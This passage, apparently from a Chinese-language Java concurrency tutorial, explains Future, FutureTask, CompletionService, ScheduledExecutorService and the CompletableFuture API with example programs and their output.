executorService.shutdown();\n    }\n\n    private static void sleep(int seconds) {\n        try {\n            TimeUnit.SECONDS.sleep(seconds);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n### prestartCoreThread ： 启动一个执行线程\n\n### prestartAllCoreThreads：启动所有执行线程\n\n### beforeExecute/afterExecute\n\n自定义ThreadPoolExecutor的子类，覆写。\n\n## Future与FutureTask\n\n\n\n### Future 接口\n\n| 接口方法                                                     |\n| ------------------------------------------------------------ |\n| V get() throws InterruptedException, ExecutionException;     |\n| V get(long timeout, TimeUnit unit)     throws InterruptedException, ExecutionException, TimeoutException; |\n| boolean isDone();                                            |\n| boolean cancel(boolean mayInterruptIfRunning);               |\n| boolean isCancelled();                                       |\n\n-  `cancel`：取消任务，如果取消任务成功则返回true，如果取消任务失败则返回false。参数`mayInterruptIfRunning`表示是否允许取消正在执行却没有执行完毕的任务： \n   1. 如果设置true，则表示可以取消正在执行过程中的任务\n   2. 如果任务已经完成，则无论mayInterruptIfRunning为true还是false，此方法肯定返回false\n   3. 如果任务正在执行，若mayInterruptIfRunning设置为true，则返回true，若mayInterruptIfRunning设置为false，则返回false\n   4. 如果任务还没有执行，则无论mayInterruptIfRunning为true还是false，肯定返回true\n-  `isCancelled`：方法表示任务是否被取消成功，如果在任务正常完成前被取消成功，则返回 true \n-  `isDone`：判断任务是否已经完成，已完成则返回true； \n-  `get()`：获取执行结果，这个方法会产生阻塞，会一直等到任务执行完毕才返回；\n-  ` get(long timeout, TimeUnit unit)`：用来获取执行结果，如果在指定时间内，还没获取到结果，就直接返回null\n\n\n\n```java\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\n\n/**\n * boolean cancel(boolean mayInterruptIfRunning);\n */\npublic class FutureExample {\n    public static void main(String[] args) throws InterruptedException {\n        ExecutorService executorService = Executors.newSingleThreadExecutor();\n        Future<String> result = executorService.submit(() -> {\n            while (!Thread.currentThread().isInterrupted()) {\n            }\n            return \"done\";\n        });\n\n        sleep(1);\n        System.out.println(result.cancel(true));\n\n        executorService.shutdown();\n        System.out.println(\"all done\");\n    }\n\n    private static void sleep(int seconds) {\n        try {\n            TimeUnit.SECONDS.sleep(seconds);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n```\n\n### FutureTask类\n\nFutureTask类实现了RunnableFuture接口，RunnableFuture接口又继承了Runable和Future，可见，FutureTask既可以作为Runnable被线程执行，又可以作为Future得到Callable的返回值。\n\nFutureTask类图如下\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/1620-1667231117133-93.png) \n\nFutureTask两个构造函数：\n\n```java\nFutureTask(Callable<V> callable);\nFutureTask(Runnable runnable, V result);\n```\n\n使用FutureTask来实现Future多线程获取任务结果的场景\n\n```java\nimport java.util.Date;\nimport java.util.concurrent.*;\n\npublic class FutureTaskTest {\n    public static void main(String[] args) {\n        ExecutorService executor = Executors.newCachedThreadPool();\n        for (int i = 0; i < 3; i++) {\n            Callable<String> callable = new Task(8 - i);\n            MyFutureTask task = new MyFutureTask(callable);\n            executor.submit(task);\n        }\n        executor.shutdown();\n    }\n}\n\nclass MyFutureTask extends FutureTask<String> {\n    public MyFutureTask(Callable<String> callable) {\n        super(callable);\n    }\n\n    @Override\n    protected void done() {\n        try {\n            System.out.println(get() + \"完成：\" + new Date());\n        } catch (InterruptedException | ExecutionException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass Task implements Callable<String> {\n    private int time;\n    public Task(int time) {\n        this.time = time;\n    }\n    @Override\n    public String call() throws InterruptedException {\n        String name = Thread.currentThread().getName();\n        System.out.println(name + \"启动：\" + new Date());\n        TimeUnit.SECONDS.sleep(time);\n        return name;\n    }\n}\n```\n\n输出结果：\n\n```javascript\npool-1-thread-1启动：Fri Nov 08 17:35:26 CST 2019\npool-1-thread-3启动：Fri Nov 08 17:35:26 CST 2019\npool-1-thread-2启动：Fri Nov 08 17:35:26 CST 2019\npool-1-thread-3完成：Fri Nov 08 17:35:32 CST 2019\npool-1-thread-2完成：Fri Nov 08 17:35:33 CST 2019\npool-1-thread-1完成：Fri Nov 08 17:35:34 CST 2019\n```\n\n## CompletionService接口\n\n 我们知道，通过 Future 和 FutureTask 可以获得线程任务的执行结果，但它们有一定的缺陷：\n\n- Future：多个线程任务的执行结果，我们可以通过轮询的方式去获取，但普通轮询会有被阻塞的可能，升级轮询会非常消耗cpu\n- FutureTask：虽然我们可以调用 done 方法，在线程任务执行结束后立即返回或做其他处理，但对批量线程任务结果的管理方面有所不足\n\n为了更好地应对大量线程任务结果处理的问题，JDK提供了功能强大的 CompletionService。CompletionService是一个接口，使用创建时提供的 Executor 对象（通常是线程池）来执行任务，并在内部维护了一个阻塞队列`QueueingFuture`，当任务执行结束就把任务的执行结果的`Future`对象加入到阻塞队列中。\n\n该接口只有一个实现类： `ExecutorCompletionService`\n\n\n\n> ExecutorCompletionService  的构造函数\n\n```java\n/**\n * Creates an ExecutorCompletionService using the supplied\n * executor for base task execution and a\n * {@link LinkedBlockingQueue} as a completion queue.\n *\n * @param executor the executor to use\n * @throws NullPointerException if executor is {@code null}\n */\npublic ExecutorCompletionService(Executor executor) {\n\tif (executor == null)\n\t\tthrow new NullPointerException();\n\tthis.executor = executor;\n\tthis.aes = (executor instanceof AbstractExecutorService) ?\n\t\t(AbstractExecutorService) executor : null;\n\tthis.completionQueue = new LinkedBlockingQueue<Future<V>>();\n}\n\n/**\n * Creates an ExecutorCompletionService using the supplied\n * executor for base task execution and the supplied queue as its\n * completion queue.\n *\n * @param executor the executor to use\n * @param completionQueue the queue to use as the completion queue\n *        normally one dedicated for use by this service. This\n *        queue is treated as unbounded -- failed attempted\n *        {@code Queue.add} operations for completed tasks cause\n *        them not to be retrievable.\n * @throws NullPointerException if executor or completionQueue are {@code null}\n */\npublic ExecutorCompletionService(Executor executor,\n\t\t\t\t\t\t\t\t BlockingQueue<Future<V>> completionQueue) {\n\tif (executor == null || completionQueue == null)\n\t\tthrow new NullPointerException();\n\tthis.executor = executor;\n\tthis.aes = (executor instanceof AbstractExecutorService) ?\n\t\t(AbstractExecutorService) executor : null;\n\tthis.completionQueue = completionQueue;\n}\n```\n\n这两个构造方法都需要传入一个线程池，如果不指定 `completionQueue`，那么默认会使用无界的 `LinkedBlockingQueue`。任务执行结果的 Future 对象就是加入到 completionQueue 中。\n\n\n\n> CompletionService 接口方法\n\n```java\npublic interface CompletionService<V> {\n    //提交线程任务\n    Future<V> submit(Callable<V> task);\n    //提交线程任务\n    Future<V> submit(Runnable task, V result);\n    //阻塞等待\n    Future<V> take() throws InterruptedException;\n    //非阻塞等待\n    Future<V> poll();\n    //带时间的非阻塞等待\n    Future<V> poll(long timeout, TimeUnit unit) throws InterruptedException;\n}\n```\n\n- submit(Callable task)：提交线程任务，交由 Executor 对象去执行，并将结果放入阻塞队列；\n- take()：在阻塞队列中获取并移除一个元素，该方法是阻塞的，即获取不到的话线程会一直阻塞；\n- poll()：在阻塞队列中获取并移除一个元素，该方法是非阻塞的，获取不到即返回 null ；\n- poll(long timeout, TimeUnit unit)：从阻塞队列中非阻塞地获取并移除一个元素，在设置的超时时间内获取不到即返回 null ；\n\n接下来，我们重点看一下submit 的源码：\n\n```java\n public Future<V> submit(Callable<V> task) {\n    if (task == null) throw new NullPointerException();\n    RunnableFuture<V> f = newTaskFor(task);\n    executor.execute(new QueueingFuture(f));\n    return f;\n }\n```\n\n从submit 方法的源码中可以确认两点：\n\n1. 线程任务确实是由 Executor 对象执行的；\n2. 提交某个任务时，该任务首先将被包装为一个QueueingFuture。\n\n继续追查 `QueueingFuture`，可以发现： 该类重写了 FutureTask 的done方法，当计算完成时，把Executor执行的计算结果放入BlockingQueue中，而==放入结果是按任务完成顺序来进行==的，即先完成的任务先放入阻塞队列。\n\n```java\n /** \n  * FutureTask extension to enqueue upon completion \n  */  \nprivate class QueueingFuture extends FutureTask<Void> {  \n    QueueingFuture(RunnableFuture<V> task) {  \n        super(task, null);  \n        this.task = task;  \n    }  \n    protected void done() { completionQueue.add(task); }  \n    private final Future<V> task;  \n}  \n```\n\n由此，CompletionService 实现了生产者提交任务和消费者获取结果的解耦，任务的完成顺序由 CompletionService 来保证，消费者一定是按照任务完成的先后顺序来获取执行结果。\n\n>  CompletionService 使用示例\n\n```java\nimport java.util.Date;\nimport java.util.concurrent.*;\n\npublic class CompletionServiceTest {\n    public static void main(String[] args) {\n        ExecutorService executor = Executors.newCachedThreadPool();\n        CompletionService<String> cs = new ExecutorCompletionService<>(executor);\n        // 此线程池运行5个线程\n        for (int i = 0; i < 5; i++) {\n            final int index = i;\n            cs.submit(() -> {\n                String name = Thread.currentThread().getName();\n                System.out.println(name + \" 启动：\" + new Date());\n                TimeUnit.SECONDS.sleep(10 - index * 2);\n                return name;\n            });\n        }\n        executor.shutdown();\n\n        for (int i = 0; i < 5; i++) {\n            try {\n                System.out.println(cs.take().get() + \" 结果：\" + new Date());\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n```java\npool-1-thread-2 启动：Sun Nov 10 11:34:13 CST 2019\npool-1-thread-4 启动：Sun Nov 10 11:34:13 CST 2019\npool-1-thread-3 启动：Sun Nov 10 11:34:13 CST 2019\npool-1-thread-5 启动：Sun Nov 10 11:34:13 CST 2019\npool-1-thread-1 启动：Sun Nov 10 11:34:13 CST 2019\npool-1-thread-5 结果：Sun Nov 10 11:34:15 CST 2019\npool-1-thread-4 结果：Sun Nov 10 11:34:17 CST 2019\npool-1-thread-3 结果：Sun Nov 10 11:34:19 CST 2019\npool-1-thread-2 结果：Sun Nov 10 11:34:21 CST 2019\npool-1-thread-1 结果：Sun Nov 10 11:34:23 CST 2019\n```\n\n## ScheduledExecutorService\n\n![image-20220726163319524](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220726163319524-1667231117133-92.png) \n\n\n\n```java\n/**\n* 1秒后开始执行任务，每2秒执行一回\n*/\npublic class ScheduledExecutorServiceTest {\n    public static void main(String[] args) {\n        ScheduledExecutorService scheduledExecutorService = Executors.newScheduledThreadPool(2);\n        //scheduledExecutorService.schedule(() -> System.out.println(Thread.currentThread().getName()), 1, TimeUnit.SECONDS);\n        AtomicLong time = new AtomicLong(-1);\n        scheduledExecutorService.scheduleAtFixedRate(() -> {\n            sleep(5);\n            if (time.get() > 0) {\n                System.out.println(Thread.currentThread().getName() + \": \" + (System.currentTimeMillis() - time.get()));\n            }\n\n            time.set(System.currentTimeMillis());\n        }, 1, 2, TimeUnit.SECONDS);\n    }\n\n    private static void sleep(int time) {\n        try {\n            TimeUnit.SECONDS.sleep(time);\n        } catch (Exception e) {\n        }\n    }\n}\n```\n\n```java\npool-1-thread-1: 5001\npool-1-thread-1: 5001\npool-1-thread-1: 5000\npool-1-thread-2: 5001\npool-1-thread-2: 5000\npool-1-thread-2: 5001\npool-1-thread-2: 5001\npool-1-thread-2: 5000\npool-1-thread-1: 5001\npool-1-thread-1: 5000\n...\n```\n\n> `ScheduledThreadPoolExecutor `特殊参数说明\n\n```java\n/**\n * 允许现有周期性任务在Shutdown之后继续执行\n */\nprivate volatile boolean continueExistingPeriodicTasksAfterShutdown;\n\n/**\n * 允许现有延时任务在Shutdown之后继续执行\n */\nprivate volatile boolean executeExistingDelayedTasksAfterShutdown = true;\n```\n\n```java\npublic class ScheduledExecutorServiceTest {\n    public static void main(String[] args) {\n        ScheduledThreadPoolExecutor scheduledThreadPool = (ScheduledThreadPoolExecutor) Executors.newScheduledThreadPool(2);\n        scheduledThreadPool.setExecuteExistingDelayedTasksAfterShutdownPolicy(false);\n        //scheduledThreadPool.setContinueExistingPeriodicTasksAfterShutdownPolicy(true);\n        final AtomicLong time = new AtomicLong(-1);\n        scheduledThreadPool.scheduleAtFixedRate(() -> {\n            sleep(3);\n            if (time.get() > 0) {\n                System.out.println(Thread.currentThread().getName() + \": \" + (System.currentTimeMillis() - time.get()));\n            }\n            time.set(System.currentTimeMillis());\n        }, 1, 2, TimeUnit.SECONDS);\n        scheduledThreadPool.shutdown();\n    }\n\n    private static void sleep(int time) {\n        try {\n            TimeUnit.SECONDS.sleep(time);\n        } catch (Exception e) {\n        }\n    }\n}\n```\n\n# CompletableFuture\n\n### 创建对象\n\n#### runAsync\n\n```java\npublic static CompletableFuture<Void> runAsync(Runnable runnable)\npublic static CompletableFuture<Void> runAsync(Runnable runnable, Executor executor)\n```\n\n#### supplyAsync\n\n```java\npublic static <U> CompletableFuture<U> supplyAsync(Supplier<U> supplier)\npublic static <U> CompletableFuture<U> supplyAsync(Supplier<U> supplier, Executor executor)\n```\n\nrunAsync 方法以Runnable函数式接口类型为参数，没有返回结果，\n\nsupplyAsync 方法Supplier函数式接口类型为参数，返回结果类型为U；\n\n没有指定Executor的方法会使用ForkJoinPool.commonPool() 作为它的线程池执行异步代码。如果指定线程池，则使用指定的线程池运行\n\n### 结果处理\n\n> 当CompletableFuture的计算结果完成，或者抛出异常的时候，我们可以执行特定的 Action\n\n#### whenComplete\n\n```java\npublic CompletableFuture<T> whenComplete(BiConsumer<? super T,? super Throwable> action)\npublic CompletableFuture<T> whenCompleteAsync(BiConsumer<? super T,? super Throwable> action)\npublic CompletableFuture<T> whenCompleteAsync(BiConsumer<? super T,? super Throwable> action, Executor executor)\n```\n\n#### exceptionally\n\n```java\npublic CompletableFuture<T> exceptionally(Function<Throwable,? extends T> fn)\n```\n\n- Action的类型是BiConsumer<? super T,? super Throwable>，它可以处理正常的计算结果，或者异常情况。\n- 方法不以Async结尾，意味着Action使用相同的线程执行，而Async可能会使用其它的线程去执行(如果使用相同的线程池，也可能会被同一个线程选中执行。\n- **这几个方法都会返回CompletableFuture。当Action执行完毕后，<font color=\"red\">返回原始的CompletableFuture的计算结果或者返回异常</font>。**\n\n```java\npublic class CompletableFutureExample2 {\n    public static void main(String[] args) {\n        CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {\n            sleep(1);\n            int data = ThreadLocalRandom.current().nextInt(20);\n            if (data % 2 == 0) {\n                System.out.println(Thread.currentThread().getName() + \"：数据-\" + data);\n                int i = 12 / 0;\n            }\n            System.out.println(Thread.currentThread().getName() + \"：执行结束\");\n        });\n        future.whenComplete(new BiConsumer<Void, Throwable>() {\n            @Override\n            public void accept(Void t, Throwable action) {\n                System.out.println(Thread.currentThread().getName() + \"：执行完成\");\n            }\n        });\n        future.exceptionally(new Function<Throwable, Void>() {\n            @Override\n            public Void apply(Throwable t) {\n                System.out.println(Thread.currentThread().getName() + \"：执行失败，\" + t.getMessage());\n                return null;\n            }\n        }).join();\n    }\n\n    private static void sleep(int seconds) {\n        try {\n            TimeUnit.SECONDS.sleep(seconds);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n正常执行结束\n\n```java\nForkJoinPool.commonPool-worker-1：执行结束\nForkJoinPool.commonPool-worker-1：执行完成\n```\n\n抛出异常\n\n```java\nForkJoinPool.commonPool-worker-1：数据-6\nForkJoinPool.commonPool-worker-1：执行失败，java.lang.ArithmeticException: / by zero\nForkJoinPool.commonPool-worker-1：执行完成\n```\n\n#### handle\n\n- 当原先的CompletableFuture的值计算完成或者抛出异常的时候，由BiFunction参数计算，<font color=\"red\">产生新的CompletableFuture</font>\n\n这组方法兼有whenComplete和转换的两个功能（whenComplete and reture）\n\n```java\npublic <U> CompletableFuture<U> handle(BiFunction<? super T,Throwable,? extends U> fn)\npublic <U> CompletableFuture<U> handleAsync(BiFunction<? super T,Throwable,? extends U> fn)\npublic <U> CompletableFuture<U> handleAsync(BiFunction<? super T,Throwable,? extends U> fn, Executor executor)\n```\n\n测试DEMO：\n\n```java\npublic static void main(String[] args) throws ExecutionException, InterruptedException {\n\tCompletableFuture<Integer> future = CompletableFuture.supplyAsync(() -> {\n\t\tint result = 100;\n\t\tSystem.out.println(\"一阶段：\" + result);\n\t\treturn result;\n\t}).handle((number, exception) -> {\n\t\tint result = number * 3;\n\t\tSystem.out.println(\"二阶段：\" + result);\n\t\treturn result;\n\t});\n\tSystem.out.println(\"最终结果：\" + future.get());\n}\n```\n\n```java\n一阶段：100\n二阶段：300\n最终结果：300\n```\n\n\n\n### 结果转换（Function）\n\n所谓结果转换，就是将上一段任务的执行结果作为下一阶段任务的入参参与重新计算，<font color=\"red\">产生新的结果</font>\n\n#### thenApply\n\n1. `thenApply` 接收一个函数作为参数，使用该函数处理上一个CompletableFuture 调用的结果，并返回一个具有处理结果的Future对象。\n\n   ```java\n   public <U> CompletableFuture<U> thenApply(Function<? super T,? extends U> fn)\n   public <U> CompletableFuture<U> thenApplyAsync(Function<? super T,? extends U> fn)\n   public <U> CompletableFuture<U> thenApplyAsync(Function<? super T,? extends U> fn, Executor executor)\n   ```\n\n   **示例：**\n\n   ```java\n   public static void main(String[] args) throws ExecutionException, InterruptedException {\n       CompletableFuture<Integer> future = CompletableFuture.supplyAsync(() -> {\n       int result = 100;\n       System.out.println(\"一阶段：\" + result);\n           return result;\n       }).thenApply(number -> {\n           int result = number * 3;\n           System.out.println(\"二阶段：\" + result);\n           return result;\n       });\n       System.out.println(\"最终结果：\" + future.get());\n   }\n   ```\n\n   ```java\n   一阶段：100\n   二阶段：300\n   最终结果：300\n   ```\n\n#### thenCompose\n\n1. `thenCompose`的参数为一个返回 CompletableFuture 实例的函数，该函数的参数是先前计算步骤的结果。\n\n   ```java\n   public <U> CompletableFuture<U> thenCompose(Function<? super T, ? extends CompletionStage<U>> fn);\n   public <U> CompletableFuture<U> thenComposeAsync(Function<? super T, ? extends CompletionStage<U>> fn) ;\n   public <U> CompletableFuture<U> thenComposeAsync(Function<? super T, ? extends CompletionStage<U>> fn, Executor executor) ;\n   ```\n\n   示例\n\n   ```java\n   public static void main(String[] args) throws InterruptedException, ExecutionException {\n       CompletableFuture<Integer> future = CompletableFuture.supplyAsync(new Supplier<Integer>() {\n           @Override\n           public Integer get() {\n               int number = new Random().nextInt(3);\n               System.out.println(\"第一阶段：\" + number);\n               return number;\n           }\n       }).thenCompose(new Function<Integer, CompletionStage<Integer>>() {\n           @Override\n           public CompletionStage<Integer> apply(Integer param) {\n               return CompletableFuture.supplyAsync(new Supplier<Integer>() {\n                   @Override\n                   public Integer get() {\n                       int number = param * 2;\n                       System.out.println(\"第二阶段：\" + number);\n                       return number;\n                   }\n               });\n           }\n       });\n       System.out.println(\"最终结果: \" + future.get());\n   }\n   ```\n\n   那么 `thenApply `和`thenCompose `有何区别呢：\n\n   - `thenApply `转换的是泛型中的类型，返回的是同一个CompletableFuture；\n   - `thenCompose` 使用上一个CompletableFutre 调用的结果在下一步的 CompletableFuture 调用中进行运算，是生成一个内部构造的新的CompletableFuture。\n\n   下面用一个例子对对比：\n\n   ```java\n   public static void main(String[] args) throws InterruptedException, ExecutionException {\n       CompletableFuture<String> future = CompletableFuture.supplyAsync(() -> \"Hello\");\n   \n       CompletableFuture<String> result1 = future.thenApply(param -> param + \" World\");\n       CompletableFuture<String> result2 = future.thenCompose(param -> CompletableFuture.supplyAsync(() -> param + \" World\"));\n   \n       System.out.println(result1.get());\n       System.out.println(result2.get());\n   }\n   ```\n\n   \n\n### 结果消费（Consumer）\n\n与结果处理和结果转换系列函数返回一个新的 CompletableFuture 不同，结果消费系列函数只对结果执行Action，而<font color=\"red\">不返回新的计算值</font>。\n\n根据对结果的处理方式，结果消费函数又分为：\n\n- `thenAccept`系列：对单个结果进行消费\n- `thenAcceptBoth`系列：对两个结果进行消费\n- `thenRun`系列：不关心结果，只对结果执行Action\n\n#### thenAccept\n\n通过观察该系列函数的参数类型可知，它们是函数式接口Consumer，这个接口只有输入，没有返回值。\n\n```java\npublic CompletionStage<Void> thenAccept(Consumer<? super T> action);\npublic CompletionStage<Void> thenAcceptAsync(Consumer<? super T> action);\npublic CompletionStage<Void> thenAcceptAsync(Consumer<? super T> action,Executor executor);\n```\n\n示例\n\n```csharp\npublic static void main(String[] args) throws ExecutionException, InterruptedException {\n    CompletableFuture<Void> future = CompletableFuture.supplyAsync(() -> {\n        int number = new Random().nextInt(10);\n        System.out.println(\"第一阶段：\" + number);\n        return number;\n    }).thenAccept(number -> System.out.println(\"第二阶段：\" + number * 5));\n    System.out.println(\"最终结果：\" + future.get());\n}\n```\n\n#### thenAcceptBoth\n\nthenAcceptBoth 函数的作用是，当两个 CompletionStage 都正常完成计算的时候，就会执行提供的action，消费两个异步的结果。没有返回值。\n\n```java\npublic <U> CompletionStage<Void> thenAcceptBoth(CompletionStage<? extends U> other,BiConsumer<? super T, ? super U> action);\npublic <U> CompletionStage<Void> thenAcceptBothAsync(CompletionStage<? extends U> other,BiConsumer<? super T, ? super U> action);\npublic <U> CompletionStage<Void> thenAcceptBothAsync(CompletionStage<? extends U> other,BiConsumer<? super T, ? super U> action, Executor executor);\n```\n\n示例\n\n```java\npublic static void main(String[] args) throws ExecutionException, InterruptedException {\n    CompletableFuture<Integer> futrue1 = CompletableFuture.supplyAsync(new Supplier<Integer>() {\n        @Override\n        public Integer get() {\n            int number = new Random().nextInt(3) + 1;\n            try {\n                TimeUnit.SECONDS.sleep(number);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"第一阶段：\" + number);\n            return number;\n        }\n    });\n\n    CompletableFuture<Integer> future2 = CompletableFuture.supplyAsync(new Supplier<Integer>() {\n        @Override\n        public Integer get() {\n            int number = new Random().nextInt(3) + 1;\n            try {\n                TimeUnit.SECONDS.sleep(number);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"第二阶段：\" + number);\n            return number;\n        }\n    });\n\n    futrue1.thenAcceptBoth(future2, new BiConsumer<Integer, Integer>() {\n        @Override\n        public void accept(Integer x, Integer y) {\n            System.out.println(\"最终结果：\" + (x + y));\n        }\n    }).join();\n}\n```\n\n#### thenRun\n\nthenRun 也是对线程任务结果的一种消费函数，与thenAccept不同的是，thenRun 会在上一阶段 CompletableFuture 计算完成的时候执行一个Runnable，但是不使用该 CompletableFuture 计算的结果。\n\n```java\npublic CompletionStage<Void> thenRun(Runnable action);\npublic CompletionStage<Void> thenRunAsync(Runnable action);\npublic CompletionStage<Void> thenRunAsync(Runnable action,Executor executor);\n```\n\n示例\n\n```java\npublic static void main(String[] args) throws ExecutionException, InterruptedException {\n    CompletableFuture<Void> future = CompletableFuture.supplyAsync(() -> {\n        int number = new Random().nextInt(10);\n        System.out.println(\"第一阶段：\" + number);\n        return number;\n    }).thenRun(() -> System.out.println(\"thenRun 执行\"));\n    System.out.println(\"最终结果：\" + future.get());\n}\n```\n\n### 结果组合\n\n#### thenCombine\n\nthenCombine 方法，合并两个线程任务的结果，并进一步处理。\n\n```java\npublic <U,V> CompletionStage<V> thenCombine(CompletionStage<? extends U> other, BiFunction<? super T,? super U,? extends V> fn);\npublic <U,V> CompletionStage<V> thenCombineAsync(CompletionStage<? extends U> other, BiFunction<? super T,? super U,? extends V> fn);\npublic <U,V> CompletionStage<V> thenCombineAsync(CompletionStage<? extends U> other, BiFunction<? super T,? super U,? extends V> fn,Executor executor);\n```\n\n示例\n\n```java\npublic static void main(String[] args) throws ExecutionException, InterruptedException {\n    CompletableFuture<Integer> future1 = CompletableFuture.supplyAsync(new Supplier<Integer>() {\n        @Override\n        public Integer get() {\n            int number = new Random().nextInt(10);\n            System.out.println(\"第一阶段：\" + number);\n            return number;\n        }\n    });\n  \n    CompletableFuture<Integer> future2 = CompletableFuture.supplyAsync(new Supplier<Integer>() {\n        @Override\n        public Integer get() {\n            int number = new Random().nextInt(10);\n            System.out.println(\"第二阶段：\" + number);\n            return number;\n        }\n    });\n  \n    CompletableFuture<Integer> result = future1.thenCombine(future2, new BiFunction<Integer, Integer, Integer>() {\n        @Override\n        public Integer apply(Integer x, Integer y) {\n            return x + y;\n        }\n    });\n    System.out.println(\"最终结果：\" + result.get());\n}\n```\n\n\n\n### 任务交互\n\n线程交互，是指将两个线程任务获取结果的速度相比较，按一定的规则进行下一步处理。\n\n#### applyToEither（转换）\n\n两个线程任务相比较，先获得执行结果的，就对该结果进行下一步的转换操作。\n\n```java\npublic <U> CompletionStage<U> applyToEither(CompletionStage<? extends T> other,Function<? super T, U> fn);\npublic <U> CompletionStage<U> applyToEitherAsync(CompletionStage<? extends T> other,Function<? super T, U> fn);\npublic <U> CompletionStage<U> applyToEitherAsync(CompletionStage<? extends T> other,Function<? super T, U> fn,Executor executor);\n```\n\n示例\n\n```java\npublic static void main(String[] args) throws ExecutionException, InterruptedException {\n    CompletableFuture<Integer> future1 = CompletableFuture.supplyAsync(new Supplier<Integer>() {\n        @Override\n        public Integer get() {\n            int number = new Random().nextInt(3);\n            try {\n                TimeUnit.SECONDS.sleep(number);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"第一阶段：\" + number);\n            return number;\n        }\n    });\n    CompletableFuture<Integer> future2 = CompletableFuture.supplyAsync(new Supplier<Integer>() {\n        @Override\n        public Integer get() {\n            int number = new Random().nextInt(3);\n            try {\n                TimeUnit.SECONDS.sleep(number);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"第二阶段：\" + number);\n            return number;\n        }\n    });\n\n    future1.applyToEither(future2, new Function<Integer, Integer>() {\n        @Override\n        public Integer apply(Integer number) {\n            System.out.println(\"最快结果：\" + number);\n            return number * 2;\n        }\n    }).join();\n}\n```\n\n#### acceptEither（消费）\n\n两个线程任务相比较，先获得执行结果的，就对该结果进行下一步的消费操作。\n\n```java\npublic CompletionStage<Void> acceptEither(CompletionStage<? extends T> other,Consumer<? super T> action);\npublic CompletionStage<Void> acceptEitherAsync(CompletionStage<? extends T> other,Consumer<? super T> action);\npublic CompletionStage<Void> acceptEitherAsync(CompletionStage<? extends T> other,Consumer<? super T> action,Executor executor);\n```\n\n示例\n\n```java\npublic static void main(String[] args) {\n    CompletableFuture<Integer> future1 = CompletableFuture.supplyAsync(new Supplier<Integer>() {\n        @Override\n        public Integer get() {\n            int number = new Random().nextInt(3) + 1;\n            try {\n                TimeUnit.SECONDS.sleep(number);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"第一阶段：\" + number);\n            return number;\n        }\n    });\n\n    CompletableFuture<Integer> future2 = CompletableFuture.supplyAsync(new Supplier<Integer>() {\n        @Override\n        public Integer get() {\n            int number = new Random().nextInt(3) + 1;\n            try {\n                TimeUnit.SECONDS.sleep(number);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"第二阶段：\" + number);\n            return number;\n        }\n    });\n\n    future1.acceptEither(future2, new Consumer<Integer>() {\n        @Override\n        public void accept(Integer number) {\n            System.out.println(\"最快结果：\" + number);\n        }\n    }).join();\n}\n```\n\n#### runAfterEither\n\n两个线程任务相比较，有任何一个执行完成，就进行下一步操作，不关心运行结果。\n\n```java\npublic CompletionStage<Void> runAfterEither(CompletionStage<?> other,Runnable action);\npublic CompletionStage<Void> runAfterEitherAsync(CompletionStage<?> other,Runnable action);\npublic CompletionStage<Void> runAfterEitherAsync(CompletionStage<?> other,Runnable action,Executor executor);\n```\n\n示例\n\n```java\nimport java.util.Random;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Supplier;\n\npublic class CompletableFutureTest {\n    public static void main(String[] args) {\n        CompletableFuture<Integer> future1 = CompletableFuture.supplyAsync(new Supplier<Integer>() {\n            @Override\n            public Integer get() {\n                int number = new Random().nextInt(5);\n                try {\n                    TimeUnit.SECONDS.sleep(number);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                System.out.println(\"第一阶段：\" + number);\n                return number;\n            }\n        });\n\n        CompletableFuture<Integer> future2 = CompletableFuture.supplyAsync(new Supplier<Integer>() {\n            @Override\n            public Integer get() {\n                int number = new Random().nextInt(5);\n                try {\n                    TimeUnit.SECONDS.sleep(number);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                System.out.println(\"第二阶段：\" + number);\n                return number;\n            }\n        });\n\n        future1.runAfterEither(future2, new Runnable() {\n            @Override\n            public void run() {\n                System.out.println(\"已经有一个任务完成了\");\n            }\n        }).join();\n    }\n}\n```\n\n#### runAfterBoth\n\n两个线程任务相比较，两个全部执行完成，才进行下一步操作，不关心运行结果。\n\n```java\npublic CompletionStage<Void> runAfterBoth(CompletionStage<?> other,Runnable action);\npublic CompletionStage<Void> runAfterBothAsync(CompletionStage<?> other,Runnable action);\npublic CompletionStage<Void> runAfterBothAsync(CompletionStage<?> other,Runnable action,Executor executor);\n```\n\n示例\n\n```java\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Supplier;\n\npublic class CompletableFutureTest {\n    public static void main(String[] args) {\n        CompletableFuture<Integer> future1 = CompletableFuture.supplyAsync(new Supplier<Integer>() {\n            @Override\n            public Integer get() {\n                try {\n                    TimeUnit.SECONDS.sleep(1);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                System.out.println(\"第一阶段：1\");\n                return 1;\n            }\n        });\n\n        CompletableFuture<Integer> future2 = CompletableFuture.supplyAsync(new Supplier<Integer>() {\n            @Override\n            public Integer get() {\n                try {\n                    TimeUnit.SECONDS.sleep(2);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                System.out.println(\"第二阶段：2\");\n                return 2;\n            }\n        });\n\n        future1.runAfterBoth(future2, new Runnable() {\n            @Override\n            public void run() {\n                System.out.println(\"上面两个任务都执行完成了。\");\n            }\n        }).get();\n    }\n}\n```\n\n#### anyOf\n\nanyOf 方法的参数是多个给定的 